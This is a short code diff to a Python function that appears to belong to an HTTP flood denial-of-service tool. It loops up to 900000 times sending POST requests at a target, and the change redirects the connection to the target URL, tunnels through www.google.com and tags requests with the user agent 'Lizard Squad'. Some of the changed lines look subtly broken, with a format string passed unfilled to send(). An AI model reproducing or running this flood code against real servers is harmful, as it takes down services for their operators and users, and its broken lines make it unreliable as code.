@@ -83,11 +83,12 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = httplib.HTTPConnection("www.ovh.nl", 80)
+	request = httplib.HTTPConnection(url, 80)
 	try:
 		for i in range(900000):
 		
-			request.request('POST', url)
+			request.set_tunnel('www.google.com', 443)
+			request.send('POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Lizard Squad\r\n\r\n', host)
 	except socket.error:
 			#print e.code
 			set_flag(1)
@@ -95,7 +96,8 @@ def httpcall(url):
 			code=500
 	else:
 			inc_counter()
-			request.request('POST', url)
+			request.set_tunnel('www.google.com', 443)
+			request.send('POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Lizard Squad\r\n\r\n', host)
 	return(code)		
 
 	
